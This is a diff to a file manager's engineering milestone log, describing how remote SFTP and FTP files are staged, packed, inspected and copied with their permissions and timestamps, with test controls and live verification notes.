+   **local** manifest short-circuits before phase one and is byte-identical to what M14 shipped,
+   which is what keeps the common case free of a second directory walk.
+   Three things fell out. A **placeholder is fetched but never weighed**, whichever gesture is
+   fetching it: `CloudDownloadPrompt` already names the file and its size and carries a Stop, so a
+   confirmation in front of it is one reporter too many for one transfer — and it would have to lie
+   about where the bytes come from, since a plan with no `requestCount` says "from the archive".
+   A **folder that is not already here is refused**, in the hand-off's own words and for its own
+   reason. And M14's rule — *a file somebody pointed at downloads, a tree sweep refuses* — is
+   unchanged but widened to the set the user actually **marked**, where before only a lone selected
+   file qualified; a file the runner *discovers* by descending into a marked folder is in no plan and
+   still meets the engine's refusal.
+   Compare needed the pair itself to change shape: the `backend == .local` gate lived in
+   `comparablePaths`, so it had to answer with **entries** — what the pair costs to read is now part
+   of the question, and only an entry carries the size that decides.
+   Controlled in nine directions, each failing only the tests that name it: reading the row's own
+   path instead of the stand-in, writing the manifest locally whatever its backend, flattening the
+   backend's refusal through an errno, claiming the whole walk rather than the intersection, queueing
+   a create with no map, refusing no folder, asking the pane's path instead of the manifest's, never
+   going two-phase, and Compare's local gate restored.
+   **One control was vacuous and had to be fixed before it meant anything** — the folder refusal
+   asserted only that *a* sheet appeared, which passed against a build that refused nothing, because
+   the sheet it then raised was the *create* sheet. Counting the sheet's buttons is the
+   language-independent discriminator (one for a refusal, three for the create sheet, whose accessory
+   carries a popup).
+   **Verified live against a throwaway `sshd`**, and the evidence is the files rather than a session
+   count, which the pane's own background poll makes useless. `run operation "file.checksumVerify"`
+   over a manifest on the server landed **three** copies under `DirnexRemote` — `files.md5` first,
+   then `a.bin` and `b.bin`, each in its own directory under its real name with the right bytes —
+   which is the two-phase gesture with nothing to click. The measurement that separates it from a
+   cache hit is the sharp one: deleting **one** copy and repeating brought back exactly that file and
+   left the other two untouched. `run operation "file.compareByContents"` over two marked SFTP rows
+   fetched both and opened FileMerge on them. Creating a manifest on a server is the half that is
+   **not** reachable headlessly — the gesture ends in a sheet, so the upload is covered by the core
+   suite against a receiving backend rather than by a live run, which is the same asymmetry Slice 3
+   recorded between Share and Open With.
+   The live run is also what caught a flaw the suite could not: Compare fetched **before** asking
+   whether a diff tool was installed, so a user with none would have paid for a download to be told
+   so. The tool question now comes first.
+5. **User scripts.** Hand the script real paths and let it run. The interesting half is a script
+   that *edits* its argument: that is the `EditedFileRegistry` watch F4 already installs, so a save
+   is offered back up rather than lost in a temp directory nobody will look in again.
+   **Landed 2026-08-27.** The write-back half was one function because it was *two and about to be
+   three*: F4-inside-an-archive and F4-on-a-server each built their own `EditedFile` behind their own
+   gate, and a script would have been the third spelling, written by somebody who had not read the
+   other two. `PanelViewController+WriteBack` is now the one place that answers *where does an edited
+   copy of this row go back to* — `nil` meaning **not watched** rather than not writable, which is
+   what keeps the nested-archive refusal F4 owns (it drops the write bits) from leaking into Open
+   With and a checksum, who read the same extraction and are not about to write.
+   **The fork that needed settling was not the files but the *directory*.** A script has one working
+   directory for the whole run and `DIRNEX_CURRENT_DIR` claimed to be "the active panel's directory",
+   which on a server, in an archive or in a results tab is a folder that does not exist — so the
+   variable is now **absent** there, exactly as `DIRNEX_OTHER_DIR` already is when there is no second
+   local pane, and a script branches on `[ -n "$DIRNEX_CURRENT_DIR" ]`. Naming the temp directory one
+   copy happens to sit in would have been a plausible answer to *where is the user looking* that is
+   not one — the same thing this repo says about a cache miss, which is "not known here" and never a
+   stand-in. Where the process *starts* is a separate question with a separate answer that is always
+   real (`UserScriptContext.workingDirectory`, derived rather than stored so the two cannot be given
+   different answers by two callers): the panel's folder when it has one, else the folder holding the
+   first file handed over — which is what a results tab had always done, now the *only* rule rather
+   than a second one. A context with neither makes **no invocations**, because a `combined` script
+   with nothing marked acts on a directory and there is none.
+   Two smaller things fell out. `localPanelDirectory` goes through **`writeDirectory`** rather than a
+   fresh `backend == .local`, which is the same question already answered once and gets the merged
+   iCloud listing right for free — its own path is synthetic while the folder underneath it is
+   perfectly real. And both panes' directories now go through that one property; the counterpart used
+   to be asked with its own inline comparison, which is one rule in two spellings.
+   Controlled in eight directions, each failing only the tests that name it and leaving Slice 3's
+   suite green: always exporting the panel variable, never falling back to the first file, always
+   having a working directory, the gate back to local-only, dropping the watch, watching every row
+   (which also fails the narrowness control that a local run watches nothing), dropping the pairing
+   guard, and reading `panel.path` instead of `writeDirectory`.
+   **Verified live against a throwaway `sshd`**, and the evidence is the server's own bytes. Two
+   marked SFTP rows through `run operation "userScript.ProbeRead"` reached the shell as
+   `…/DirnexRemote/<uuid>/alpha.txt` and `…/beta.txt` — each in its own directory under its real
+   name, holding the server's content — with `DIRNEX_CURRENT_DIR` printing **empty**, which is the
+   design decision measured rather than argued. Then `ProbeEdit`, appending a line to `"$1"`, left
+   **both files on the server** carrying that line: fetched, handed over, edited, noticed, uploaded,
+   with nothing to click. The control is the one that separates it from "any script run uploads" —
+   the read-only script ran again afterwards and the server's checksums did not move — and the
+   deletion control is the sharp one, since "nothing changed" would also be true of a dead gesture:
+   removing **one** copy and repeating brought back exactly that file, in a new directory, carrying
+   the server's *current* bytes including the edit the earlier run had uploaded, and left the other
+   untouched.
+   **The one thing it does not do is coordinate.** A script that rewrites forty remote files produces
+   forty independent write-backs, each re-`stat`ing and uploading on its own the way F4's single save
+   does — no combined bar, no Stop, no ordering. That is the shape M24 Slice 2 gave the *download*
+   direction and the upload direction has never had. It was handed to M25 here and M25 never took a
+   slice for it; **demoted 2026-08-30** to PLAN.md §4 ▸ *Still open*, which is where its size
+   honestly puts it — one `FileOperation` kind over the queue that already exists, not a design.
+6. **Pack in both directions, and browsing a `.zip` on a server.** Both ends of ⌥F5 stage — build
+   into temp, upload the archive — and browsing one is the mirror. This is the slice that needs the
+   "the whole file is coming down" sentence, and the one where a *nested* archive stays out of
+   scope for the reason it always has: its bytes are already a temp copy.
+   **Landed 2026-08-27**, and the source half needed no staging directory at all — which was the
+   measurement that decided the design. `bsdtar` accepts `-C` **interleaved with the names** in
+   create mode (probed against libarchive 3.7.4: `-c -f out.zip -C /a alpha.txt -C /b beta.txt`
+   writes both members correctly), and `ArchiveSourceItem` has split the absolute `onDiskPath` from
+   the relative `archivePath` since M19 — so both writers already wanted a per-source directory and
+   only their entry points did not. ``PackSource`` is that pair, `-C` is emitted **only where the
+   directory changes**, and an ordinary pack's argv is byte-identical to what it always sent. No
+   hardlinks, no gathering, nobody's bytes copied twice.
+   **It fixes a bug nothing had reported: ⌥F5 in a *tree* has been wrong since trees shipped.** The
+   pack was handed `panel.path` plus bare names, so a marked row inside an expanded folder named a
+   file that is not in the pane's own directory — `bsdtar` failed, and the encrypted walk skipped
+   the missing name and wrote a **smaller archive without saying so**. The same fix covers it,
+   because the answer to *where are this row's bytes* is now asked of the row.
+   **A folder that is not already here is refused**, in the hand-off's own words and for its reason,
+   which is a *correction* to the claim `MaterializationPlan.pendingDirectories` carried from Slice
+   1 — it said a pack would stage the subtree. Written before any gesture read it, and wrong by the
+   time one did: all four that read it now refuse, staging a remote tree is F5's engine pointed at a
+   temp directory, and nobody has built that.
+   The **destination** is asked `capabilities(for:)` on its own directory rather than "is it on this
+   Mac", so a writable bucket takes the archive and a read-only one is refused before a byte is
+   written. `PackStaging` is the one definition of *where does the archive go* — nothing at all for
+   a local destination, and build-in-temp-then-transfer for a server, swept whatever happens — and
+   both pack paths use it, which is what stops the two from drifting. A refused upload comes home as
+   the backend's own `VFSError` about the archive's path rather than as an `EncryptedArchiveError`:
+   the write worked and the transfer did not, and those are different sentences. The upload's bytes
+   are **added** to the bar's total rather than replacing it, so it grows once at the transition and
+   runs on to the end — the two alternatives are a full bar parked for the length of a network
+   transfer, and an aggregate that walks backwards.
+   `EncryptedArchiveError.needsLocalFile` went with it, catalog entries and all: its own doc comment
+   said "until then a non-local job fails fast", and *then* is now.
+   **Browsing a `.zip` on a server reuses the nested-archive registry rather than growing a second
+   one**, because it is the same shape — a mount whose bytes are a temp copy — and three things fall
+   out of that which are exactly what is wanted: the way up goes back to the *server's* directory,
+   the breadcrumb names the server (the crumb builder had to learn that, or it drew
+   `Macintosh HD › private › tmp › DirnexRemote › <uuid>`), and the mount is **read-only**, since a
+   write would land in the temp copy rather than in the archive on the server. Repack-then-upload is
+   its own pass and is reachable now that the pack half exists.
+   Controlled in ten directions, each failing only the tests that name it: the folder refusal
+   dropped, the destination gate back to local-only, `canPackFromHere` back to local-only, sources
+   named from the row instead of the file, one leading `-C` for the whole set, staging disabled, the
+   ⏎ route removed, the crumbs rooted at the extraction again, a placeholder *directory* classified
+   as one, and the remote origin walked as an enclosing archive. The narrowness controls are the
+   half that matters most and all stayed green throughout: a **local** folder still packs, an
+   ordinary remote **file** still opens in its own application rather than being mounted, and the
+   nested and top-level crumb chains are untouched.
+   **Verified live against a throwaway `sshd`**, and unlike Slices 3–5 the gesture is *not* drivable
+   headlessly — ⌥F5 ends in the pack sheet, which is a nested question no AppleScript verb gets past.
+   So the live half is a checked-in suite gated on the same config file `SFTPLiveIntegrationTests`
+   uses (`PackLiveIntegrationTests`), driving the real `SFTPProcessTransport`, the real `bsdtar` and
+   the real mount. Two objects staged off the server into **two different directories** packed into
+   one archive whose members came back with the server's exact bytes, under the names the user
+   marked and with no trace of where they were staged; an encrypted archive built here landed on the
+   server, where **`bsdtar` — which is not ours — listed `payload.txt` in it and then demanded a
+   passphrase to extract it**, so it is a real zip and really encrypted; and a `.zip` on the server
+   came down whole and listed `one.txt`, `two.txt`. The independent read is the point in each case:
+   the upload is checked by a *fresh* download rather than by asking the writer what it wrote, which
+   is the trap Slice 10's own probe fell into one milestone ago.
+   **A stronger assertion found a bug three green runs had not**, and it is worth the sentence: the
+   crumb test first asserted a *suffix*, which is true of a trail carrying everything twice
+   (`… › srv › backup.zip › srv › backup.zip › docs`) — the remote origin was being walked as though
+   it were an enclosing archive, whose `path` is an archive-inner path where a server's is not. The
+   same run showed the root crumb reading "Macintosh HD", because the fixture's backend id was a
+   hand-built string `backendRootTitle` cannot parse, so the test had been measuring the fallback.
+   Both are fixed and both are now pinned by an equality over the whole list.
+   **The one thing it does not do is put a plain pack's upload on the queue.** A plain pack has never
+   been a queue job — that is the libarchive boundary §M19 drew, and it is the *encrypting* that
+   earns the queue — so a `.tar.gz` bound for a server is reported by the status line and has no bar
+   and no Stop for its transfer. Encrypting the same archive puts both halves on the bar.
+7. **Get Info, read-only, on a remote row.** The SFTP and FTP listings already carry mode, owner,
+   group and modification date into `FileEntry`; `AttributesController` refuses to draw them. Read
+   first and write in M25, because the two fail differently — a panel that shows a mode it cannot
+   change is honest, and one that offers a change it cannot make is not.
+   **Landed 2026-08-28, and the premise above was half wrong — which is what the slice turned out to
+   be about.** Probed before any Swift: the listings carry mode and date, and **owner and group were
+   read and thrown away** — `ColumnarListing.unixRow` reads columns 0 and 4–7 and skipped 2 and 3, so
+   every remote `FileEntry` carried `ownerID == 0` while the answer had been arriving in the same line
+   as the mode since M5. And they are **names**, not ids (`oleg     staff`), which is why they could
+   never have gone into `ownerID`: `AttributesSnapshot` resolves an id through this Mac's `getpwuid`,
+   so a server's `501` would have drawn the local account of whoever is reading the panel over a file
+   belonging to a stranger.
+   **The finding that decided the design is that two backends *invented* a mode.** S3 and FTP's
+   DOS/IIS dialect both answered `0o755`/`0o644`, each under a comment explaining that `0` "would
+   render every remote row as unreadable in the permissions column" — and the columns are `name`,
+   `size` and `date`. There is no permissions column, and there never was: the fabrication was
+   harmless for exactly as long as nothing displayed it, and this slice is the reader that would have
+   drawn it as the server's own word. So `FileEntry.permissions` is now **optional**, because `0`
+   cannot stand in for the absence — `chmod 000` is a legal mode — and the compiler is what stops the
+   next display site inheriting a stand-in. The blast radius was one pass-through: `ArchiveSourceItem`
+   takes its mode from a real `stat`, so packing never read it.
+   Two things came out of it that the slice did not predict. The mode reader was **approximate** —
+   `s`/`S`/`t`/`T` were all read as a plain execute bit, which is fine for a row that draws no
+   permissions and wrong in a panel whose job is to state a fact, so a `rwsr-xr-x` binary would have
+   been disclaimed as `rwxr-xr-x`; it is exact now, and `POSIXPermissions` already stored and rendered
+   all twelve bits. And the **archive** was throwing its mode away too, using only the leading kind
+   character while `bsdtar -tvf` printed the real one in the same column — with the owner arriving as
+   *names* for a tar and *bare numbers* for a zip, which stores none, so even one tool's answer changes
+   shape with the format.
+   **A separate read-only panel rather than the four-tab one degraded**, because three of its four
+   tabs would have had nothing to say: no remote listing carries an ACL, an extended attribute, an
+   access time or a birth time. `RemoteAttributesController` is built on one rule — *a field with no
+   answer is absent, never blank and never a stand-in* — with notes that explain the absence, so a
+   short panel reads as a fact about the server rather than as a panel that failed to load. Which
+   rows it will draw is a pure `fields(for:)`, and which panel a selection deserves is a pure
+   `AttributesRoute`, so both are testable with nothing presented — a real window in the test host
+   makes it do real pane work and destabilizes its neighbours (docs/NOTES.md ▸ Testing).
+   The routing is **per row, not per pane**, which is the shape §M24 Slice 6 had already paid for in
+   the pack sources: a results tab holds hits from anywhere and a tree draws several directories at
+   once. That retired the `!isVirtualDirectory` gate in favour of `nameMatchesPath`, which is the
+   honest form of it — the old one refused every ordinary file standing beside iCloud's app rows, and
+   every hit in a results tab, for the sake of a handful of synthetic ones. A **mixed** marked set is
+   now refused rather than served short: the bulk panel is an editor, and the old local-only filter
+   quietly opened it over the local subset, editing fewer items than the user marked.
+   Controlled in nine directions, each failing only the tests that name it: S3 and the DOS dialect
+   inventing a mode again, the archive dropping its mode, `UnixRow` dropping owner and group, the
+   local-only filter back in `attributesTargets`, the route ignoring the backend, the panel drawing a
+   permissions row unconditionally — plus two narrowness controls that stayed green throughout (an
+   ordinary mode gains no special bits, and no entry produces an empty panel).
+   **Verified live against a throwaway `sshd`, with the OS as the independent judge.** The real
+   parser fed the real bytes a real server printed agreed with this Mac's own `lstat` on all six
+   files, including `setuid.bin` at **4755** and a sticky directory at **1777** — the two the old
+   approximating reader flattened to 0755 and 0777, which is the control that makes the agreement
+   evidence rather than a coincidence. Then the whole gesture in the built app, restored onto that
+   server: `targets=1` on a remote row (the old filter would have made it 0), the panel opened, and
+   it drew `mode=4755 owner=oleg group=wheel` — the server's own words, end to end.
+   One thing about the instrument is worth keeping: `TabPersistence` reads `data(forKey:)`, so a tab
+   seeded with `defaults write -string` is silently **not restored** and the pane falls back to Home.
+   It cost two runs, and the tell was a false one — the server's log showed sessions that were the
+   probe's own earlier `sftp` calls, which is this file's own warning that a session count is not
+   evidence, met from the other side. Seed with `-data <hex>`.
+
+**Deliberately not in scope.** Content-grep and tag search on a server, both withheld at M22 for
+the reason that has not changed — no remote backend can answer either without reading every file.
+ACLs and extended attributes remotely, which SFTP and FTP do not carry at all. Open in Terminal for
+an SFTP account, which is an `ssh` session and a different feature. And Get Info's **write** half,
+which is M25's.
+
+### M25 — What a remote write carries, and what a remote delete costs (M)
+
+Opened 2026-08-27 alongside M24 and closed 2026-08-29. Eight slices, of which the fifth landed as
+**5a–5d**; every one of them opened with probes against a real `sshd` (OpenSSH 10.2p1) and a real
+FTP server rather than a man page, and three of the five opening measurements changed the design —
+including a correction this repo owed itself, since `sftp` has had a server-side `copy` verb all
+along and NOTES.md said twice that it had not. Its third part, **a Trash where no protocol has
+one**, closed on 2026-08-29 as a decision *not* to build one; the reasoning is
+[PLAN.md](../PLAN.md) §7, and what stands in for it is the confirmation that already says nothing
+can be undone.
+
+Three parts, and they share a subject: a remote operation that succeeds while quietly doing less
+than the local one it stands in for. Two of them are slices; the third was a format commitment and
+closed as a decision **not** to build (PLAN.md §7, 2026-08-29).
+
+**A copy that carries more than bytes.** `VFSBackend.copyMetadata` defaults to a no-op and SFTP and
+FTP both take the default, so a mode and a timestamp are dropped on every transfer with nothing said.
+Extended attributes and ACLs are out of scope in both directions — neither protocol carries them, and
+that is a limit rather than a gap. What the protocol *does* offer is more than "wire up `chmod`", and **the five lines below were
+probed 2026-08-28 against a real `sshd` (OpenSSH 10.2p1) and a real FTP server** before any Swift,
+because a man page is not a server. Three of them changed the design and one is a correction this
+repo owed itself; the detail is in docs/NOTES.md.
+
+- **`get -p` / `put -p` carry more than the man page promises and less than it implies.** Measured
+  in both directions: the low nine permission bits and **both** timestamps arrive exactly — it says
+  "permissions and access times" and the *modification* time comes too — while **set-uid, set-gid
+  and the sticky bit are silently dropped**, on a mode the server itself puts on the wire (`ls -la`
+  prints `-rwsr-xr-x`). Plain `get`/`put` carries the mode only approximately: the umask applies
+  and a download's local `open` forces owner-write, so `0777` lands as `0755` and `0444` as `0644`
+  while `0600`, `0640`, `0700` and `0754` all survive untouched — so a probe that happens to pick
+  one of the second group measures a preservation that is not there.
+- **`chmod` is therefore strictly more capable than `-p`, not merely its fallback**: `chmod 4755`
+  over the wire really does produce `-rwsr-xr-x`. A mode carrying special bits costs one extra
+  round trip and an ordinary mode costs none. `chmod`, `chown` and `chgrp` all take **`-h`**,
+  verified in both directions — with it the *link* changed and its target did not, without it the
+  target changed and the link did not. `chown` to another uid is refused unprivileged (exit 1,
+  `remote setstat "…": Permission denied`), which is the ordinary answer rather than a fault.
+- **`copy`/`cp` exists, is genuinely server-side, and settles the correction.** OpenSSH advertises
+  **`copy-data revision 1`**, and it duplicated **64 MiB in 0.08 s** — the whole session, connect
+  and authentication included — with the two files SHA-256 identical. A server without it makes the
+  client print its own **`Server does not support copy-data extension`**, so it degrades per
+  connection exactly as M22's exec walk does, and `RelayCopy` stays the only mechanism for a pair
+  of ends on *different* backends. `cp` preserves the low nine bits and drops the special ones, so
+  it needs the same corrective `chmod` as `-p` — one place that finishes a copy's mode, not two.
+- **A symlink's target is unreadable over `sftp` and readable over the exec channel**, as
+  predicted. `ls -la` of a directory prints the kind and no ` -> target`, and `ls -la` of the link
+  **follows it**, reporting the target's mode and size — the same trap this repo already records
+  for classifying an item before a recursive delete. `readlink` over `ssh` returns the raw text for
+  relative, absolute and dangling links alike, so this degrades per connection and an `sftp`-only
+  account keeps today's refusal. `CopyEngine` passes `entry.symlinkDestination ?? ""`, so
+  proceeding without a target would write `ln -s "" link`.
+- **FTP is richer than "the mode alone", and that assumption was wrong.** `SITE CHMOD` carries the
+  mode, and **`MFMT` writes an exact, UTC-anchored modification time** (RFC 3659) which `MDTM`
+  reads back — round-tripped against the local truth on a host at `+0300`, so a timezone error
+  could not have hidden. The coarse, year-less, zone-less stamp belongs to **`LIST`**, not to the
+  protocol. Every `-Q` refusal is `curl` exit 21 with the reply code separating the two cases that
+  need different sentences: **500** for an unimplemented verb, **550** for a file problem — already
+  what `FTPTransportError.classify` reads.
+
+**Get Info's write half, and Synchronize on a side with no exact clock.** M24 draws a remote row's
+mode and dates; this makes them editable through the same verbs above, with the same per-connection
+degradation. `DirectorySync` is the other consumer of the same fact: comparing by timestamp is
+deliberately refused for FTP and S3 and always will be, but comparing by **size** is honest and is
+simply not built — and once ⌥F3 can fetch two sides (M24 Slice 4), comparing by *contents* is
+reachable too, at a price the plan from M24 Slice 1 can state up front.
+
+**A Trash where no protocol has one — closed by not building one (2026-08-29).** Every remote
+delete is permanent and unreversible, because `deleteStrategy` degrades to `.permanent` wherever
+`.trash` is absent and it is absent everywhere remote. Inventing one — a managed `.dirnex-trash/`
+prefix, a rename into it, and a sidecar naming the origin the way a trash folder's `.DS_Store`
+carries `ptbL`/`ptbN` — was a **format commitment that outlives the code**, so it was §7's open
+question rather than a slice. It closed against: the price is not uniform (one cheap rename over
+SFTP and FTP, N copies plus N deletes on S3), and a Trash that exists on some backends and not
+others is a worse promise than none. The confirmation stays what stands in for it and already says
+there is nothing to undo, so this milestone builds nothing here; §7 carries the reasoning.
+
+#### Slices
+
+Core first, then the app, as usual. Each lands runnable, and each degrades **per connection at run
+time** rather than by asking a server in advance — none of these capabilities can be queried, so
+the shape is M22's: attempt the verb, read the refusal, remember it for that connection, and leave
+the old behaviour standing where it cannot be established.
+
+1. **The metadata carry, in the core.** ``RemoteMetadataPlan`` decides what one transfer must do to
+   carry its source's mode and times, and — the half that matters — what it will *lose*, so a
+   caller can say so instead of approximating. `SFTPBatchCommand` grows `-p` on both transfer verbs
+   and the `chmod`/`chown`/`chgrp` builders (each with `-h`); `FTPQuoteCommand` grows `SITE CHMOD`
+   and `MFMT`. Pure, tested, additive; no app rebuild.
+   **Landed 2026-08-28.** The rule needed **two capabilities, not one flag**, because `-p` and
+   `chmod` are not fallbacks for each other: `-p` is exact for the nine bits and both timestamps
+   and cannot express a special bit, while `chmod` expresses all twelve and knows nothing about
+   time. So an ordinary mode rides `-p` alone and costs exactly what it always did, only a mode
+   carrying set-uid, set-gid or the sticky bit pays for the corrective round trip, and an account
+   that has refused `chmod` keeps the nine bits and **reports the loss** rather than claiming the
+   mode.
+   **A `nil` mode is not a loss**, which is the distinction the whole type turns on and the one a
+   sentinel would have destroyed: S3 and FTP's DOS/IIS dialect report no mode at all, so folding
+   "absent" together with "dropped" would make every S3 copy claim damage it did not do — the same
+   fact ``FileEntry/permissions`` became optional for one milestone earlier. The access time gets
+   the same treatment for the same reason, and reading a file over `sftp` **bumps the source's own
+   atime to now**, so even a carried access time is a copy of a value the act of copying has
+   changed.
+   Controlled in four directions, each failing only the tests that name it: the corrective `chmod`
+   dropped (three failures, one per special bit), an absent mode reported as a loss, `MFMT` written
+   in the local zone rather than UTC — which produced `20180607110910` against a truth of
+   `…080910`, the exact three-hour error that would have reached a server silently and only for
+   some users — and the over-correction of sending a `chmod` for every mode, which fails the
+   narrowness control that an ordinary transfer is byte-identical to what it always sent.
+   **Verified live against the same `sshd` and FTP server**, and the point is that nothing was
+   hand-typed: a throwaway package built against `DirnexCore` emitted the batch lines and the
+   server executed *those*, so what was measured is the builder rather than agreement between two
+   things we wrote. A set-uid source came down **104755** carrying its exact mtime, the `-h` line
+   left the link at `700` and its target untouched at `644`, and the generated `SITE CHMOD`/`MFMT`
+   pair moved a real FTP file to `100754` and `1528358950`. The narrowness control is what makes
+   that evidence: a plain `get` of the same source gives **100755** and a mtime of *now*.
+2. **Wiring the carry through the transports**, so `copyFile` in both directions asks the plan what
+   it needs and the app reports what a copy could not keep. This is where the per-connection latch
+   lands, and where `copyMetadata` — today a no-op default the engine calls only for a directory it
+   recreated by hand — stops being a no-op for SFTP and FTP.
+   **Landed 2026-08-28.** Four things were measured against the real `sshd` and a real FTP server
+   before any Swift, and three of them changed the shape.
+   **A refused follow-up must not fail a transfer whose bytes have landed.** Under `sftp -b` a batch
+   **aborts on the first failed command and exits 1**, so a `chmod` refused after a `put` reported a
+   perfectly good copy as a failure; `sftp`'s `-` prefix fixes it exactly — exit 0, the bytes still
+   there, and the refusal **still on stderr**, which is what keeps the loss reportable rather than
+   merely swallowed. A step that succeeds prints nothing at all (measured: stderr exactly 0 bytes),
+   so the ordinary transfer is untouched. The same hazard over FTP is worse: a quote command sent
+   alongside the transfer is refused as `curl` **exit 21** *after* the upload, and `curl`'s
+   continue-on-failure prefix avoids that only by destroying the attribution — `%{http_code}` reports
+   the **last** reply, so a refused `SITE CHMOD` behind a good `MFMT` is invisible. Hence FTP's steps
+   run in one invocation of their own, where reply **500** (a verb this server lacks, so latch it)
+   and **550** (that file's problem, so do not) separate cleanly. `curl`'s prefix order is its own
+   trap and fails silently: `*-CMD` sends the literal `-SITE …` **before** the transfer, is answered
+   500, and still exits 0 — the mode never applied, on a run reporting complete success.
+   **A metadata refusal must never be read as the transfer's failure**, which is the bug the split
+   (`SFTPMetadataStderr`) exists for: `detect(stderr:)` scans the whole stream for `permission
+   denied` and `no such file` first, so a refused `chmod` turned a completed copy into
+   `.permissionDenied`. It has a family in **each** direction, both read out of `/usr/bin/sftp`
+   rather than guessed — `remote setstat "…"` from `put -p`/`chmod`, and `local chmod` / `local set
+   times` from `get -p`, the latter equally able to make a finished download classify as denied.
+   **The capabilities describe the *destination*, not the wire.** A download lands on this machine,
+   where `chmod` and `utimes` always work, so it carries everything the hint holds even on a
+   connection whose server has refused to keep anything — reading the wire's limits into that
+   direction would drop a time the disk was perfectly able to take and blame the protocol for it.
+   That asymmetry is also what makes both directions **free**: the hint (`CopySourceHint`) comes from
+   the listing `CopyEngine` already made, where asking would be a whole connection — 71 ms against a
+   loopback `sshd`, a real handshake over a network.
+   Controlled in five directions, each failing only the tests that name it: the corrective `chmod`
+   dropped, a download reading the wire's capabilities, latching a refusal `curl` cannot attribute,
+   a transport's declared capabilities defaulting to SFTP's rather than to nothing, and a refusal
+   recorded as no loss at all. Two of the controls were **inert on first writing** and that is the
+   finding worth keeping: `.ftp` and `.localDestination` happen to be the same set, so the download
+   test discriminated nothing until the connection was latched first; and the fake *declares* its
+   capabilities, so it shadows the protocol default the test was aimed at.
+   **Verified live end to end**, through the real `SFTPProcessTransport` and `FTPCurlTransport`
+   rather than any double: a set-uid source landed **04755** with its exact mtime, an FTP upload
+   landed **0754** with an exact `MFMT` time, and a `chmod` at a path that is not there came back as
+   an *answer* rather than a thrown failure. The controls are what make that evidence — with the
+   corrective `chmod` removed the same server reports **0755**, and with FTP's step invocation
+   removed the mode is the umask's and the time is the moment the upload ran.
+   Two limits of the read-back were paid for in wrong assertions first, and both are the *listing's*
+   rather than the carry's: `ls -la` drops the time of day for a file older than about six months, so
+   a 2018 fixture failed by exactly its own time of day; and an FTP `LIST` stamp is zone-less on the
+   server's clock, so the same assertion failed by exactly this machine's +0300.
+   **What is deliberately not here is the sentence a user reads.** The loss is accumulated per
+   connection (`RemoteMetadataSupport.loss`, aspects and a count) and nothing on screen consults it
+   yet: where it belongs — a status line, the operation report, Get Info — is a surface decision that
+   travels with Slice 5's Get Info write half rather than one to settle in the transports. A draining
+   `takeLoss()` was written alongside the accumulator and deleted, because the run boundary it marked
+   is the reporting caller's to define and this repo has paid before for API justified by a reader
+   that does not exist.
+3. **Server-side `copy`.** A duplicate inside one SFTP account stops being a download and an upload
+   through this Mac, latched per connection on the client's own refusal, with `RelayCopy` unchanged
+   beneath it. `RelayCopy`'s doc comment and docs/NOTES.md both said no remote protocol has a copy
+   verb; this slice is where that correction lands in the code rather than only in the notes.
+   **Landed 2026-08-28.** The probe found one thing the earlier pass had not measured and it decided
+   the slice: **`cp` carries no timestamp at all.** With an *old* source the copy comes back stamped
+   `now` where the relay's `get -p`/`put -p` reproduces 2018 exactly, in the same run against the
+   same server — and `sftp`'s batch language has no verb that sets a time. So the fast path is the
+   **less faithful** one, which inverts what "server-side" suggests, and the trade was Oleg's to make
+   rather than mine: `cp` at 0.09 s for 64 MiB against 0.5 s staged over *loopback* (and zero bytes
+   on the wire against two copies of the file over a real link), with the modification time counted
+   as **dropped** through the accumulator Slice 2 built. That is what separates this from the failure
+   the milestone exists to prevent — the speed is bought with a report, not with silence.
+   The mode is carried whole, and the corrective `chmod` is sent for an *ordinary* mode too, which is
+   a second measurement rather than caution: an occupied destination is overwritten **in place** and
+   keeps its own mode (`100600` stayed `100600` while its bytes became the source's). `cp` is regular
+   files only and follows a symlink; neither reaches `CopyEngine`, which walks a tree itself.
+   **The refusal is a *fact about the account*, so it latches and nothing else does.** The route is
+   `.serverSide` rather than `.direct` — the shape S3's cross-bucket copy already had, an attempt
+   with `RelayCopy` behind it — because a server either advertises `copy-data` or does not and
+   nothing asks in advance. `VFSCapabilities.internalCopy` deliberately stays absent: a promise the
+   next server can withdraw is not a capability, so it is a method (`mayAttemptInternalCopy`) that
+   goes false after one refusal and costs every later copy nothing.
+   Six controls, each failing only the tests that name it: the plan built **with** the preserve flag
+   (which claims a modification time it never wrote — `dropped → []`, `loss → nil`, the exact silent
+   failure), latching on any failure rather than the client's own sentence, the matcher shortened
+   from OpenSSH's whole sentence to the token `copy-data` (which a file *called* `copy-data.txt`
+   would then trip), reporting no progress at all, and the router sending the pair back to staging.
+   **Verified live against a real `sshd`, and against one built to refuse.** `sftp-server -P copy-data`
+   bans the request, so a server without the extension is reachable on this Mac on demand rather than
+   waited for: there the account-level suite reports `.unsupported(.remoteToRemoteCopy)` — the right
+   answer — and the *route* test still lands the file, which is the degradation end to end. On an
+   ordinary server the same route test passes unchanged, which is why it asserts what holds on both
+   and never which route ran.
+   **The first live control was inert and that is the finding worth keeping.** Removing the
+   corrective `chmod` left the live suite green, because a plan built with `-p` still emits a `chmod`
+   for a *special* bit — so the test that named the fix could not see it. The discriminating case is
+   the **occupied destination**, and adding it made the same control fail on demand. A green live run
+   with the fix removed is not a passing control; it is a test measuring something else.
+4. **Symlink targets over the exec channel**, degrading exactly as M22's search walk does, so a
+   link is copied faithfully on an account that has one and goes on being refused on an account
+   that does not.
+   **Landed 2026-08-28.** The probe overturned the verb the slice was written around and found the
+   bug to be worse than the plan recorded, and both are corrections this repo owed itself.
+   **`readlink` is the obvious verb and loses on all three counts that matter**, each measured
+   against a real `sshd`: it cannot be **authenticated** — `runCommand` hands back stdout and no exit
+   status, and an `sftp`-only account answers exec with prose *on stdout*, so a bare reader would
+   recreate the link pointing at an English sentence; it cannot be **batched** — with several
+   operands it prints one line per *successful* one and silently skips failures (three arguments,
+   two lines), so a reader zipping outputs to inputs gives one link another's target, which is worse
+   than having none; and it cannot be **framed**, since a target may contain a newline. `ls -ldn`
+   answers all three: every row echoes the path it describes and carries a mode field, so prose
+   cannot pass, and its **size column is the target's byte length**, which is what says where the
+   target starts. The cost is the *connection* and not the row — 77 ms for one link, 79 ms for
+   twelve — so the seam takes a **batch**, and the engine resolves a directory's children in one go.
+   **A first-arrow split is wrong in both directions, and the size column is the only thing that
+   knows.** ` -> ` is four ordinary characters a name and a target may each contain: a link *named*
+   `a -> b` pointing at `c` prints `…/a -> b -> c`, where the shipped reading answers `b -> c`. Nine
+   adversarial targets were checked against the server — two with newlines, one a tab, one a trailing
+   space, one containing ` -> ` and one ending in it — and the column equalled the true byte length
+   every time, which is POSIX's definition of a symlink's size rather than one `ls`'s habit. The
